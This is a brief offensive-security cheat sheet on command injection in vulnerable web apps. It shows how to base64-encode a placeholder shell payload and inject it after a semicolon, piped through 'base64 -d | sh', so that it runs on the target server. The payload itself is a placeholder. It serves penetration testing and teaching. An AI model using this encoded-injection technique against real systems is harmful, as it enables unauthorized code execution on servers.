# Command Injection via a Vulnerable Web App
This cheat sheet will cover a few common methods for testing command injection for various vulnerable web applications.
## Encoding HTTP Request with Shell Payload
If you encounter issues while trying to send a payload with command injection ot an HTTP request, you can attempt to use Base64 to encode the payload and decode it on the server before executing it as so,
```
root@attacker-machine:~# echo '(SHELL CODE)' | base64 
KFNIRUxMIENPREUpCg==
```
Then, send the payload to the command injection like so,
```
(COMMAND 1);echo KFNIRUxMIENPREUpCg== | base64 -d | sh
```
This will decode the Base64 and run it on the server.
